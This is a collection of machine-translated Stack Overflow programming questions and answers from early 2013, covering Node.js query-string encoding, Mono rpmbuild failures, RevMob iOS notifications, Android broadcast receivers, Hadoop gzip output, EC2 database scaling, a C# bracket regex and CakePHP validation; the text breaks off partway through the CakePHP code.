# node.js - 如何处理包含非 utf8 字符的 GET 参数？

> ID：14111902
> 
> 赞同：3
> 
> 时间：2013-01-01T16:03:41.487
> 
> 标签：node.js, character-encoding, express, query-string

在基于 nodejs/express 的应用程序中，我需要处理可能包含使用 iso-8859-1 字符集编码的变音符号的 GET 请求。

不幸的是，它的查询字符串解析器似乎只处理纯 ASCII 和 UTF8：

```
> qs.parse('foo=bar&xyz=foo%20bar')
{ foo: 'bar', xyz: 'foo bar' } # works fine
> qs.parse('foo=bar&xyz=T%FCt%20T%FCt')
{ foo: 'bar', xyz: 'T%FCt%20T%FCt' } # iso-8859-1 breaks, should be "Tüt Tüt"
> qs.parse('foo=bar&xyz=m%C3%B6p')
{ foo: 'bar', xyz: 'möp' } # utf8 works fine 
```

是否有隐藏选项或另一种干净的方法可以使其与其他字符集一起使用？默认行为的主要问题是我无法知道是否存在解码错误 - 毕竟，输入*可能*只是简单地解码为仍然看起来像 urlencoded 字符串的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T10:15:15.570

那么[URL 编码](https://www.rfc-editor.org/rfc/rfc3986)应该始终是 UTF-8，其他情况可以被视为编码攻击并拒绝请求。没有非 utf8 字符这样的东西。我不知道为什么您的应用程序可以获取任何编码的查询字符串，但是如果您只在页面上使用字符集标题，那么您可以使用浏览器。对于 API 请求或其他内容，您可以指定 UTF-8 并拒绝无效的 UTF-8 作为错误请求。

如果您真的是指 ISO-8859-1，那么它非常简单，因为字节完全匹配 unicode 代码点。

```
'T%FCt%20T%FCt'.replace( /%([a-f0-9]{2})/gi, function( f, m1 ) {
    return String.fromCharCode(parseInt(m1, 16));
}); 
```

虽然它在网络上可能永远不会是 ISO-8859-1，但实际上是 Windows-1252。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T21:49:21.823

也许[node-iconv](https://github.com/bnoordhuis/node-iconv)是一个解决方案。您事先知道使用哪种编码吗？

```
var qs = require('qs');
var Buffer = require('buffer').Buffer;
var Iconv  = require('iconv').Iconv;

var parsed = qs.parse('foo=bar&xyz=T%FCt%20T%FCt');
var iconv = new Iconv('ISO-8859-1', 'UTF-8');
var buffer = iconv.convert(parsed.xyz);
var xyz = buffer.toString(); 
```

# mono - rpmbuild 中的 xbuild 不起作用

> ID：14111904
> 
> 赞同：1
> 
> 时间：2013-01-01T16:03:49.710
> 
> 标签：mono, fedora, rpmbuild, xbuild

我目前正在尝试将我们的项目打包到 Fedora RPM 中。因此我使用以下规范：http: [//sourceforge.net/p/audiocuesheet/code/145/tree/trunk/RPM%20Build/AudioCuesheetEditor.spec](http://sourceforge.net/p/audiocuesheet/code/145/tree/trunk/RPM%20Build/AudioCuesheetEditor.spec)

如果我尝试在“build”阶段使用 xbuild 构建 rpm，则输出如下：

```
+ xbuild /property:Configuration=Release AudioCuesheetEditor.sln
XBuild Engine Version 2.10.8.0
Mono, Version 2.10.8.0
Copyright (C) Marek Sieradzki 2005-2008, Novell 2008-2011.

Build started 01/01/2013 16:53:18.
__________________________________________________
Project "/home/makerpm/rpmbuild/BUILD/AudioCuesheetEditor-0.2.1/AudioCuesheetEditor.sln" (default target(s)):
    Target ValidateSolutionConfiguration:
            Building solution configuration "Release|x86".
    Target Build:
            Project "/home/makerpm/rpmbuild/BUILD/AudioCuesheetEditor-0.2.1/AudioCuesheetEditor.csproj" (default target(s)):
                    Target PrepareForBuild:
                            Configuration: Release Platform: x86
                            Created directory "bin/Release/"
                            Created directory "obj/x86/Release/"
                    Target CopyNonResxEmbeddedResources:
                            Copying file from '/home/makerpm/rpmbuild/BUILD/AudioCuesheetEditor-0.2.1/gtk-gui/gui.stetic' to '/home/makerpm/rpmbuild/BUILD/AudioCuesheetEditor-0.2.1/obj/x86/Release/AudioCuesheetEditor.gtk-gui.gui.stetic'
                    Target GenerateSatelliteAssemblies:
                    No input files were specified for target GenerateSatelliteAssemblies, skipping.
                    Target CoreCompile:
                            Tool /usr/bin/gmcs execution started with arguments: /noconfig /debug- /optimize- /out:obj/x86/Release/AudioCuesheetEditor.exe /resource:obj/x86/Release/AudioCuesheetEditor.gtk-gui.gui.stetic,gui.stetic gtk-gui/generated.cs MainWindow.cs gtk-gui/MainWindow.cs AssemblyInfo.cs Language.cs Speechfile.cs Option.cs Program.cs Optionfile.cs Cuesheet.cs Track.cs Cuesheetfile.cs Audiofile.cs TextInputfile.cs Projectfile.cs MainClass.cs Logfile.cs OptionWindow.cs gtk-gui/AudioCuesheetEditor.OptionWindow.cs /target:winexe /main:AudioCuesheetEditor.MainClass /reference:/usr/lib/mono/2.0/System.dll /reference:/usr/lib/mono/2.0/Mono.Posix.dll /reference:/usr/lib/mono/gtk-sharp-2.0/gtk-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/gdk-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/glib-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/glade-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/pango-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/atk-sharp.dll /reference:/usr/lib/mono/2.0/System.Xml.dll /warn:4
gtk-gui/MainWindow.cs(152,51): error CS1012: Too many characters in character literal
gtk-gui/MainWindow.cs(171,52): error CS1012: Too many characters in character literal
gtk-gui/MainWindow.cs(199,53): error CS1012: Too many characters in character literal
gtk-gui/AudioCuesheetEditor.OptionWindow.cs(181,67): error CS1012: Too many characters in character literal
gtk-gui/AudioCuesheetEditor.OptionWindow.cs(247,64): error CS1012: Too many characters in character literal
                    Task "Csc" execution -- FAILED
                    Done building target "CoreCompile" in project "/home/makerpm/rpmbuild/BUILD/AudioCuesheetEditor-0.2.1/AudioCuesheetEditor.csproj".-- FAILED
            Done building project "/home/makerpm/rpmbuild/BUILD/AudioCuesheetEditor-0.2.1/AudioCuesheetEditor.csproj".-- FAILED
    Task "MSBuild" execution -- FAILED
    Done building target "Build" in project "/home/makerpm/rpmbuild/BUILD/AudioCuesheetEditor-0.2.1/AudioCuesheetEditor.sln".-- FAILED
Done building project "/home/makerpm/rpmbuild/BUILD/AudioCuesheetEditor-0.2.1/AudioCuesheetEditor.sln".-- FAILED

Build FAILED. 
```

有趣的是，如果我使用标准源代码包并运行 xbuild，一切都可以完美运行：

```
[sven@Sven AudioCuesheetEditor-src-v0.2.1]$ xbuild /property:Configuration=Release AudioCuesheetEditor.sln 
XBuild Engine Version 2.10.8.0
Mono, Version 2.10.8.0
Copyright (C) Marek Sieradzki 2005-2008, Novell 2008-2011.

Build started 01.01.2013 16:54:17.
__________________________________________________
Project "/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/AudioCuesheetEditor.sln" (default target(s)):
    Target ValidateSolutionConfiguration:
            Building solution configuration "Release|x86".
    Target Build:
            Project "/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/AudioCuesheetEditor.csproj" (default target(s)):
                    Target PrepareForBuild:
                            Configuration: Release Platform: x86
                            Created directory "bin/Release/"
                            Created directory "obj/x86/Release/"
                    Target CopyNonResxEmbeddedResources:
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/gtk-gui/gui.stetic' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/obj/x86/Release/AudioCuesheetEditor.gtk-gui.gui.stetic'
                    Target GenerateSatelliteAssemblies:
                    No input files were specified for target GenerateSatelliteAssemblies, skipping.
                    Target CoreCompile:
                            Tool /usr/bin/gmcs execution started with arguments: /noconfig /debug- /optimize- /out:obj/x86/Release/AudioCuesheetEditor.exe /resource:obj/x86/Release/AudioCuesheetEditor.gtk-gui.gui.stetic,gui.stetic gtk-gui/generated.cs MainWindow.cs gtk-gui/MainWindow.cs AssemblyInfo.cs Language.cs Speechfile.cs Option.cs Program.cs Optionfile.cs Cuesheet.cs Track.cs Cuesheetfile.cs Audiofile.cs TextInputfile.cs Projectfile.cs MainClass.cs Logfile.cs OptionWindow.cs gtk-gui/AudioCuesheetEditor.OptionWindow.cs /target:winexe /main:AudioCuesheetEditor.MainClass /reference:/usr/lib/mono/2.0/System.dll /reference:/usr/lib/mono/2.0/Mono.Posix.dll /reference:/usr/lib/mono/gtk-sharp-2.0/gtk-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/gdk-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/glib-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/glade-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/pango-sharp.dll /reference:/usr/lib/mono/gtk-sharp-2.0/atk-sharp.dll /reference:/usr/lib/mono/2.0/System.Xml.dll /warn:4
                    Target _CopyDeployFilesToOutputDirectoryPreserveNewest:
                            Creating directory '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/Texts.xml' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/Texts.xml'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/LICENCE_DE.TXT' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/LICENCE_DE.TXT'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/LICENCE_EN.TXT' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/LICENCE_EN.TXT'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/LICENCE.TXT' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/LICENCE.TXT'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/README.TXT' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/README.TXT'
                            Creating directory '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-64.png' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-64.png'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-48.png' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-48.png'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-32.png' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-32.png'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-24.png' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-24.png'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-22.png' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-22.png'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-16.png' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-16.png'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-48.ico' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-48.ico'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-32.ico' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-32.ico'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-24.ico' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-24.ico'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-22.ico' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-22.ico'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-16.ico' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-16.ico'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/CHANGELOG.TXT' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/CHANGELOG.TXT'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/KNOWN_ISSUES.TXT' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/KNOWN_ISSUES.TXT'
                            Creating directory '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/samples'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/samples/Sample_Inputfile.txt' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/samples/Sample_Inputfile.txt'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/samples/Sample_Project.ace' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/samples/Sample_Project.ace'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/samples/Sample_Inputfile2.txt' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/samples/Sample_Inputfile2.txt'
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/resources/icons/application-x-cue-128.png' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/resources/icons/application-x-cue-128.png'
                    Target DeployOutputFiles:
                            Copying file from '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/obj/x86/Release/AudioCuesheetEditor.exe' to '/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/bin/Release/AudioCuesheetEditor.exe'
            Done building project "/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/AudioCuesheetEditor.csproj".
            The project 'Packages' is disabled for solution configuration 'Release|x86'.
Done building project "/home/sven/Downloads/AudioCuesheetEditor-src-v0.2.1/AudioCuesheetEditor.sln".

Build succeeded.
     0 Warning(s)
     0 Error(s)

Time Elapsed 00:00:00.8477090 
```

那么，谁能告诉我，为什么 rpmbuild 中的构建失败了？提前致谢。

问候斯文

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-05T16:15:10.117

我不知道 mono 构建环境，但您应该始终记住 rpmbuild 环境无法与“普通”用户环境相提并论。大多数**环境变量**是不同的，但也有其他东西，比如 /home/user/.anyconfigfile 等资源配置。

如果您在像您的环境一样 rpmbuilding 的同时设置单声道构建环境并且问题仍然存在，那么您应该使用 strace/ltrace 进行调试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T19:28:10.687

我可以通过使用此代码找到自己

```
LC_CTYPE=de_DE.UTF-8 xbuild /property:Configuration=Release AudioCuesheetEditor.sln 
```

# iphone - 如何将 revmob 本地通知集成到 iOS 应用程序所需的分步指南

> ID：14111905
> 
> 赞同：1
> 
> 时间：2013-01-01T16:04:01.427
> 
> 标签：iphone, ios, xcode, revmob

我将 revmob 横幅、全屏和弹出窗口集成到我的 iPhone 和 iPad 应用程序中，并使用最新的 revmob SDK 和使用展示位置 ID。一切正常。

我现在也想将 revmob[本地通知](http://sdk.revmob.com/ios#localnotification)集成到这些应用程序中。我不是程序员，但我正在寻找一步一步的指南来做到这一点。请假设 revmob SDK 已经在应用程序中正常工作。

revmob“本地通知”说明说明了两件事：

1号：

```
[[RevMobAds session] scheduleLocalNotification]; 
```

您是否将其放入 appdelegate.m 文件中的以下行：`didFinishLaunchingWithOptions`

2号：

```
- (void)application:(UIApplication *)application didReceiveLocalNotification:(UILocalNotification *)notification {
    [[RevMobAds session] processLocalNotification:notification];
} 
```

您是否只是在 appdelegate.m 文件末尾附近自行复制所有内容？

编号 3：您还需要做些什么来设置这些在 revmob 网站上未提及的本地通知吗？

目前我已经完成了上面的第 1 点和第 2 点。当我执行第 2 项时，它给了我一个警告，但该应用程序在我的 iPhone 上运行良好。等了24小时，本地通知没有出现。

我在模拟器中得到这个输出：

[RevMob] 请求本地通知数据。

[RevMob] [LocalNotification] 目前没有适用于该设备/国家的广告，或者您的 App ID 已暂停。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T13:34:33.187

第 1 步和第 2 步看起来没问题，不需要第 3 步。

您所说的这条消息表明您的设备没有广告（或您的应用程序 ID 已暂停）。根据您所在的国家/地区和设备，您有时可能没有广告。你有其他设备吗？

“scheduleLocalNotification”方法在 RevMob 认为最好的时候自动安排通知。这些天，这个时间是下午 5:30 左右。

如果您想确定预定时间，您可以使用“scheduleLocalNotification:”方法，查看[API 文档站点](http://sdk.revmob.com/ios-api/Classes/RevMobAds.html#//api/name/scheduleLocalNotification%3a)。

# android - 从运行启动的广播接收器使用 alertDialog 启动活动

> ID：14111906
> 
> 赞同：1
> 
> 时间：2013-01-01T16:04:06.073
> 
> 标签：android, android-intent

首先我希望我会尊重这个论坛的网络礼仪，因为这是我第一次使用它。

这是我的问题：我有一个具有以下结构的 Android 应用程序：

1.  ***主要活动***（根据 SMS 内容显示一些用户指示和一些警报对话框（参见 2））
2.  ***在启动时运行的SMS 广播接收器***（它工作正常，在启动时运行，读取 SMS 并以正确的方式解析它们）。

我希望能够在接收者收到正确的 SMS 时激活 Activity 并显示 AlertDialog。如果我首先显示 Activity 然后离开它（因此如果 Activity 进入挂起状态），一切工作正常，但如果我从不打开 Activity，我只能显示 Activity 本身，但不能激活 AlertDialog。

这是两段小代码：

接收方（接收特定短信时执行的代码）：

```
//Show/start activity
Intent sec=new Intent(context, SecureMessagesActivity.class);
sec.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
context.startActivity(sec);
// Activate AlertDialog
Intent i = new Intent(context.getString(R.string.intentReceivedSuccessSms)).putExtra("some_msg", "I will be sent!");
context.sendBroadcast(i);
Log.v(TAG, "Sent Intent intentReceivedSuccessSms"); 
```

Activity（在 android manifest 中定义为 singleTop）：

```
public void onCreate(Bundle savedInstanceState) 
{
    Log.v(TAG, "Performing onCreate");

    super.onCreate(savedInstanceState);

    setTheme( android.R.style.Theme_Light);
    setContentView(R.layout.main);

    //--------------------------------------------------------------
    // Manage subscription to intent
    //--------------------------------------------------------------
    IntentFilter intentFilter = new IntentFilter(
            getString(R.string.intentReceivedSuccessSms));
    mReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(final Context context, Intent intent) {
                AlertDialog.Builder ad = new AlertDialog.Builder(context);
                ad.setTitle(getString(R.string.youFoundIt));
                ad.setMessage(getString(R.string.stopTheMusic));
                ad.setIcon(R.drawable.tick);
                ad.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                   public void onClick(DialogInterface dialog, int which) {                             
                            Log.v(TAG, "Received button pressure to stop ringtone");
                       };
                   }
            );
            ad.show();
        }

    };
    //registering our receiver
    this.registerReceiver(mReceiver, intentFilter);
    //--------------------------------------------------------------
    // End of manage subscription to intent
    //--------------------------------------------------------------
} 
```

我认为我的问题与未激活应用程序时只有广播接收器处于活动状态有关，因此我从未运行过 Activity 的 OnCreate 方法。通过这种方式，我认为首先启动活动（参见评论“显示/启动活动”）并立即发送 OnCreate 方法接受的广播消息（因此仍未注册，因为接收方发送 Intent 时 OnCreate 仍未启动）。但我不明白如何解决它，我认为这是一个架构问题。请注意，如果我启动手机并发送 2 条消息，则会发生这种情况：

1.  电话开启
2.  第一条短信
3.  活动显示，没有警报对话框
4.  最小化活动（或让它全屏，没关系）
5.  Activity 出现，带有 AlertDialog

任何帮助将不胜感激

祝你新年快乐。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T10:02:03.200

由于您已经解释过自己的原因，这不起作用：

> 如果 Activity 尚未运行，则无法启动它并立即发送广播 Intent。在您发送广播 Intent 的那一刻，您的活动尚未开始，因此您的侦听器尚未注册。

您应该直接将消息信息添加到用于启动活动的 Intent 中，如下所示：

```
//Show/start activity
Intent sec=new Intent(context, SecureMessagesActivity.class);
sec.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
sec.putExtra("some_msg", "I will be sent!");
context.startActivity(sec);
Log.v(TAG, "Sent Intent intentReceivedSuccessSms"); 
```

然后，在里面`onCreate()`和里面`onNewIntent()`你可以得到额外的并用它来显示你的对话框。你不需要`BroadcastReceiver`在你的活动中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-17T14:21:27.747

```
Intent sec=new Intent(context, Dialog.class);
            sec.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            context.startActivity(sec); 
```

您需要在活动中使用它！

```
public class Dialog extends Activity 
{

@Override
protected void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);

    this.getWindow()
    .setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);

    AlertDialog.Builder builder = new AlertDialog.Builder(this);

    builder
        .setTitle("Califica la llamada")
        .setMessage("Esto ayudará a brindarte un mejor servicio de telefonía!")

        .setCancelable(true)
        .setPositiveButton("Buena", new DialogInterface.OnClickListener() 
        {
            public void onClick(DialogInterface dialog, int id) 
            {
                dialog.cancel();
                finish();
            }
        })
        .setNegativeButton("Mala", new DialogInterface.OnClickListener() 
        {
            public void onClick(DialogInterface dialog, int id) 
            {
                dialog.cancel();
                finish();
            }
        });

    AlertDialog alert = builder.create();
    alert.show();

}
} 
```

# hadoop - 在 Hadoop 中使用 MultipleOutputs 时 GZIP 文件末尾损坏

> ID：14111911
> 
> 赞同：0
> 
> 时间：2013-01-01T16:04:44.983
> 
> 标签：hadoop, gzip

我正在压缩 Hadoop MR 作业的输出：

```
conf.setOutputFormat(TextOutputFormat.class);
TextOutputFormat.setCompressOutput(conf, true);
TextOutputFormat.setOutputCompressorClass(conf, GzipCodec.class); 
```

我正在使用 MultipleOutputs，例如：

```
MultipleOutputs.addMultiNamedOutput(conf, "a", TextOutputFormat.class, Text.class, Text.class);
MultipleOutputs.addNamedOutput(conf, "b", TextOutputFormat.class, Text.class, Text.class);
LazyOutputFormat.setOutputFormatClass(conf, TextOutputFormat.class); 
```

另外，这些都很好用。我可以得到我想要的输出划分，我可以得到 gzipped 输出。但是，将它们一起使用时，gzip 压缩的文件最终似乎已损坏。每个输出文件大约有 25000 行。当我做类似的事情时

```
hadoop dfs -cat output/*.gz | less +24000 
```

一切看起来都很正常。但如果我这样做

```
hadoop dfs -cat output/*.gz | less +40000 
```

我收到错误，例如

```
zcat: stdin: invalid compressed data--crc error
zcat: stdin: invalid compressed data--length error
zcat: stdin: invalid compressed data--format violated 
```

如果我重复第一个命令并开始扫描文件，最终我会在一行不完整或几行非常长、非常损坏的行之后遇到上述错误之一（我认为它们很长，因为换行符也已损坏）并且`less`可以不要再进一步了。

So, my question is: has anyone seen this before, and is there a way to fix it?

Note: I am using the mapred API instead of mapreduce. I can try to translate to the new API, but if I can find a solution using mapred, that would be preferable.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T16:26:55.433

Simply a guess (without seeing your reducer code), but are you calling `MultipleOutputs.close()` (on the instance of MultipleOutputs, rather than a static method, which doesn't exist) in the cleanup method of your reducer?

It looks like the final block of the gzip files are not being written - consistent with not calling the above method

# amazon-ec2 - 使多个 Amazon EC2 实例写入单个数据库

> ID：14111913
> 
> 赞同：3
> 
> 时间：2013-01-01T16:05:27.720
> 
> 标签：amazon-ec2

我有一个周末访问量很大的网站。访问者在此站点上所做的是 - 他们回答测验问题并尽快提交。

当 javascript 尝试从服务器获取问题以及尝试提交到数据库时，我的服务器会获得大量流量。

该应用程序是使用 mysql 和 PHP 创建的。当我的访问者提交时，我希望他们能够提交到单个数据库而不是多个数据库，因为 EBS 卷只能附加到一个 EC2 实例。

流量很大，所以我需要更多实例来支持在流量高峰期间运行的任何实例。我可以做些什么来实现如此高的可用性，为我的访问者提交的所有答案提供单一存储库？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T09:28:22.707

您可以使用 Amazon RDS。基本上，它是一个没有硬盘的实例之外的数据库。您可以设置多个实例来连接到您的 RDS。

您还可以添加 ec2 实例以进行水平扩展，以解决您的流量高峰问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-02T09:45:37.337

您有不同的选项来扩展您的应用程序：

1.  如果现在一切都在一个实例上运行，您可以将它们分成两个实例：一个用于 Web 服务器，一个用于数据库。使用 EC2，您可以使用安全组来允许从 Web 服务器访问数据库。
2.  如果 Web 服务器成为瓶颈，请添加更多实例并使用 Amazon 的 ELB 在各个实例之间进行负载平衡。您甚至可以使用自动缩放来根据流量动态增加和减少正在运行的实例的数量。
3.  如果数据库是瓶颈，您可以首先将其移至更大的实例类型。您还可以将 Amazon 的 RDS 服务用于托管 mysql 服务。
4.  要进一步增加容量，您可以使用只读副本（如果应用程序是读取密集型的）来分配负载。

直到上面第 4 点，您应该能够在不修改应用程序的情况下完成所有操作。为了进一步扩大规模，还有几件事需要注意：

*   添加缓存：使用 memcached 或 Amazon 的 Elasticache。这可能会增加很大的推动力。
*   转移到 Amazon 的 DynamoDB 之类的东西，您可以在其中轻松地根据需要添加读写容量。

祝你好运！

# c# - 正则表达式使用c#测试字符串是否包含在[括号]中

> ID：14111914
> 
> 赞同：2
> 
> 时间：2013-01-01T16:05:29.210
> 
> 标签：c#, regex

我的字符串可能用括号括起来也可能不括起来

```
string a = "[Hello world]";
string b = "Hello world"; 
```

只要字符串包含 []，以下正则表达式就会返回 true，但这不是目标 :)

```
var c = "hello[ ]world";
var isCommandArray = Regex.IsMatch(c, @"\[.*?\]"); // returns true 
```

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-01T16:16:54.903

如果您允许其他括号位于中间，则不必使用`Regex`：

```
bool isBracketed = s.StartsWith("[") && s.EndsWith("]"); 
```

如果您**不允许**中间有其他括号，您仍然可以这样做：

```
bool isBracketed = s.LastIndexOf("[") == 0 && s.IndexOf("]") == s.Length - 1; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T16:06:46.437

用于`^`模式的开始和模式`$`的结束。

```
var isCommandArray = Regex.IsMatch(c, @"^\[.*?\]$") 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T16:09:16.933

您需要对正则表达式进行编码，使其与字符串的开头和结尾相匹配。

```
^\[.*?\]$ 
```

`^`表示字符串的开始，并`$`表示结束。

如果您想在大括号周围允许空格，您可以添加`\s`：

```
^\s*\[.*?\]\s*$ 
```

# php - CakePHP 不显示表单验证消息

> ID：14111916
> 
> 赞同：0
> 
> 时间：2013-01-01T16:05:32.193
> 
> 标签：php, validation, cakephp

我正在尝试构建我的第一个 CakePHP 应用程序，当我尝试添加到数据库时，我遇到了表单验证未显示的问题。在提交表单时，我收到了 flash 消息（如下面的控制器所示），但没有显示单独的验证。

模型：

```
class Client extends AppModel {

public $validate = array (

'businessName' => array (
    'mustNotBeBlank'=>array(
        'rule'=>'notEmpty',
        'message'=>'Must not be empty'
                ),
    'mustBeUnique'=>array(
        'rule'=>'isUnique',
        'message'=>'Name already registered'
                ),
    'maxLength50'=>array (
        'rule'=>array('maxLength', 50),
    'message'=>'Exceeds 50 Characters'
                )
    ),

'address1' => array (
    'mustNotBeBlank'=>array(
        'rule'=>'notEmpty',
        'message'=>'Must not be empty'
                ),
    'maxLength50'=>array (
        'rule'=>array('maxLength', 50),
    'message'=>'Exceeds 50 Characters'
                )
    ),

'address2' => array (
    'mustNotBeBlank'=>array(
        'rule'=>'notEmpty',
        'message'=>'Must not be empty'
                ),
    'maxLength50'=>array (
        'rule'=>array('maxLength', 50),
    'message'=>'Exceeds 50 Characters'
                )
    ),
'address3' => array (
    'mustNotBeBlank'=>array(
        'rule'=>'notEmpty',
        'message'=>'Must not be empty'
                ),
    'maxLength50'=>array (
        'rule'=>array('maxLength', 50),
    'message'=>'Exceeds 50 Characters'
                )
    ),

'postCode' => array (
    'mustNotBeBlank'=>array(
        'rule'=>'notEmpty',
        'message'=>'Must not be empty'
                ),
    'postCode' => array(
            'rule'=>array('postal', null, 'uk'),
            'message'=>'Please enter a valid postcode'
                    )
    ),

'telephone1' => array (
    'mustNotBeBlank'=>array(
        'rule'=>'notEmpty',
        'message'=>'Must not be empty'
                ),
    'maxLength11'=>array (
        'rule'=>array('maxLength', 11),
    'message'=>'Exceeds phone number length'
                ),
    'mustBeNumber'=>array(
            'rule' =>'numeric',
            'message' => 'Must be a number'
                    )
    ),

'telephone2' => array (
    'maxLength11'=>array (
        'rule'=>array('maxLength', 11),
    'message'=>'Exceeds phone number length'
                ),
    'mustBeNumber'=>array(
            'rule' => 'numeric',
            'message' => 'Must be a number'
                    )

    ),

'email' => array (
        'rule'    => array('email', true),
        'message' => 'Please supply a valid email address.'
),

    'domain' => array (
        'rule' => 'url',
        'message' => 'Please supply a valid email address.'
)
);

} 
```

查看（为简单起见删除了 html）：

```
echo $this->form->create();
echo $this->Form->input('businessName', array('label' => 'Business Name'));
echo $this->Form->input('address1', array('label' => 'Address'));
echo $this->Form->input('address2', array('label' => ''));
echo $this->Form->input('address3', array('label' => ''));
echo $this->Form->input('postCode', array('label' => 'Postcode'));
echo $this->Form->input('telephone1', array('label' => 'Landline'));
